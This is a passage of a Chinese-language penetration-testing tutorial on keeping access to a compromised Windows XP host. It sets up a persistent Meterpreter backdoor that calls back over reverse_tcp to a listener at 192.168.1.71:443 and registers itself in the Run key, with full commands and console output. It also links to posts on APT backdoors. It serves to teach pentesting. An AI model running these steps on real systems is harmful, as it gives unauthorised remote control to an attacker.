       972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
       1000  Explorer.exe       C:\WINNT\Explorer.exe                                 
       1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
    meterpreter > pwd
    C:\WINDOWS\system32
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    meterpreter >
在这里我们有一个典型的Meterpreter会话！其次，要小心，何时以及如何使用这个技巧。如果您通过在系统上放置这样一个有用的后门，使攻击者的工作更容易，但是系统所有者就不会感到高兴。
#### Meterpreter服务
##### 了解Metasploit Meterpreter
在经历了所有渗透系统的艰苦工作之后，将自己较容易的方式留在系统中供以后使用通常是一个好主意，也就是我们常说的`后门`。这样，如果您最初利用的服务已关闭或打补丁，您仍然可以访问系统。Metasploit有一个Meterpreter脚本persistence.rb，它将创建一个Meterpreter服务，即使远程系统重新启动，您也可以使用它。
在我们继续下一步之前，有一个警告的话。这里显示的持久Meterpreter不需要认证。这意味着任何连接这个的人都可以进入后门！如果您正在进行渗透测试，这不是一件好事，因为这可能是一个重大的风险。在现实世界的情况下，一定要格外谨慎，一旦完成任务，一定要清理干净。
一旦我们获得已有权限的主机，我们用`-h`开关运行持久性脚本来查看哪些选项可用：
    eterpreter > run persistence -h
    [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
    [!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
    Meterpreter Script for creating a persistent backdoor on a target host.
    OPTIONS:
        -A        Automatically start a matching exploit/multi/handler to connect to the agent
        -L   Location in target host to write payload to, if none %TEMP% will be used.
        -P   Payload to use, default is windows/meterpreter/reverse_tcp.
        -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
        -T   Alternate executable template to use
        -U        Automatically start the agent when the User logs on
        -X        Automatically start the agent when the system boots
        -h        This help menu
        -i   The interval in seconds between each connection attempt
        -p   The port on which the system running Metasploit is listening
        -r   The IP of the system running Metasploit listening for the connect back
我们将设置持续的Meterpreter会话，等待用户登录到远程系统，然后尝试每隔5秒钟在端口443上的IP地址192.168.1.71连接回监听器。
    meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
    [*] Creating a persistent agent: LHOST=192.168.1.71 LPORT=443 (interval=5 onboot=true)
    [*] Persistent agent script is 613976 bytes long
    [*] Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
    [*] Agent executed with PID 492
    [*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
    [*] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
    [*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
    meterpreter >
请注意，脚本的输出为您提供了在完成时删除持久侦听器的命令。 一定要记下来，这样你就不会在系统上留下未经验证的后门。
要验证它是否工作，我们重新启动远程系统并设置我们的payload程序。
    eterpreter > reboot
    Rebooting...
    meterpreter > exit
    [*] Meterpreter session 3 closed.  Reason: User exit
    msf exploit(ms08_067_netapi) > use exploit/multi/handler
    msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 192.168.1.71
    LHOST => 192.168.1.71
    msf exploit(handler) > set LPORT 443
    LPORT => 443
    msf exploit(handler) > exploit
    [*] Started reverse handler on 192.168.1.71:443
    [*] Starting the payload handler...
当用户登录到远程系统时，会为我们打开一个Meterpreter会话。
    [*] Sending stage (748544 bytes) to 192.168.1.161
    [*] Meterpreter session 5 opened (192.168.1.71:443 -> 192.168.1.161:1045) at 2010-08-21 12:31:42 -0600
    meterpreter > sysinfo
    Computer: XEN-XP-SP2-BARE
    OS      : Windows XP (Build 2600, Service Pack 2).
    Arch    : x86
    Language: en_US
    meterpreter >
权限维持的东西这些只是冰山一角，更多的等待我们自己去发现、探索。  
关于后门，最近有个老师傅总结一些apt的。都是实战中得出的经验。  
他们在这！  
[php安全新闻早八点-高级持续渗透-第一季关于后门](https://micropoor.blogspot.hk/2017/12/php.html)  
[php安全新闻早八点-高级持续渗透-第二季关于后门补充一](https://micropoor.blogspot.hk/2017/12/php_24.html)  
[php安全新闻早八点-高级持续渗透-第三季关于后门补充二](https://micropoor.blogspot.hk/2017/12/php_25.html)  
[php安全新闻早八点-高级持续渗透-第四季关于后门](https://micropoor.blogspot.hk/2017/12/php_72.html)
### 0x04结论
`保持访问权限`是一个具有非常具体的目的阶段 -允许渗透测试者停留在目标系统中，直到他获得他认为有价值的信息，然后设法从系统中成功提权。然而，即使如此，说起来容易做起来难。让我们来比较一下，在未经他人许可的情况下，在别人的房子里进行长期活动
-和进入家里走一段时间是一回事，但是如果你想在没有吸引主人的注意的情况下再待一会儿，那又是另外一回事了。尽管在网络世界中这种类似Houdini的技巧可能会稍微简单一些，但仍然具有挑战性。具有挑战性但并非不可能。
### 0x05参考文献列表
    blog.globalknowledge.com（2011）。黑客攻击的5个阶段：维护访问。可在http://blog.globalknowledge.com/technology/security/hacking-cybercrime/the-5-phases-of-hacking-maintaining-access/（23-06-2016）
    Bull，D。（2016）。数据泄露，第4部分：数据如何离开你的四面墙？可在https://blogs.mcafee.com/business/data-exfiltration-part-4-data-leave-four-walls/（23-06-2016）
    Buskirk，P。（2015）。先进的方法来检测先进的网络攻击：HTTP（S）Exfiltration。可在http://www.novetta.com/2015/01/advanced-methods-to-detect-advanced-cyber-attacks-https-exfiltration/（23-06-2016）
    DaBoss（2013）。隐形病毒和Rootkit。可在http://www.cknow.com/cms/vtutor/stealth-viruses-and-rootkits.html（23-06-2016）
    FixMeStick（2015）。病毒实验室 - 什么是Rootkit？可在https://www.fixmestick.com/blog/what-is-a-rootkit/（23-06-2016）
    gadgetreview.com（2015）。什么是Rootkit及其为什么是危险的？可在http://www.gadgetreview.com/what-are-rootkits-and-why-they-are-dangerous（23-06-2016）
    卡巴斯基。Rootkit是如何工作的。可在https://usa.kaspersky.com/internet-security-center/internet-safety/what-is-rootkit-virus（23-06-2016）
    主。N.（2015）。什么是数据泄露？可在https://digitalguardian.com/blog/what-data-exfiltration（23-06-2016）
    Lewis，N.（2011）。检测隐蔽通道，防止企业数据泄露。可在http://searchsecurity.techtarget.com/answer/Detecting-covert-channels-to-prevent-enterprise-data-exfiltration（23-06-2016）
    McAfee（2015）。停止数据泄露。可在http://www.mcafee.com/us/resources/solution-briefs/sb-quarterly-threats-aug-2015-1.pdf（23-06-2016）
    占领网站（2015年）。如何用Tunnelshell创建几乎不可察觉的隐蔽通道。可在http://null-byte.wonderhowto.com/how-to/hack-like-pro-create-nearly-undetectable-covert-channel-with-tunnelshell-0155704/（23-06-2016）
    史密斯，吨（2015年）。通过朦胧透视 - 检测攻击者窃取您的数据的策略。可在http://www.tripwire.com/state-of-security/security-data-protection/cyber-security/exfiltration-through-obscrurity/（23-06-2016）
    splunk.com（2014）。检测并停止数据泄露。可在http://www.splunk.com/en_us/solutions/solution-areas/security-and-fraud/use-cases/detect-and-stop-data-exfiltration.html（23-06-2016）
    趋势科技（2013）。数据泄露：威胁行为者如何窃取您的数据？可在http://about-threats.trendmicro.com/cloud-content/us/ent-primers/pdf/how_do_threat_actors_steal_your_data.pdf（23-06-2016）
    阶段4 - 维护访问。可在http://www.techrepublic.com/blog/it-security/the-five-phases-of-a-successful-network-penetration/（23-06-2016）
    演讲主题上：“CIS 450 -网络安全第15章-保留访问” -演讲全文：可在http://slideplayer.com/slide/7323200/（23-06-2016）
    什么是一个rootkit。https://www.avast.com/c-rootkit（23-06-2016）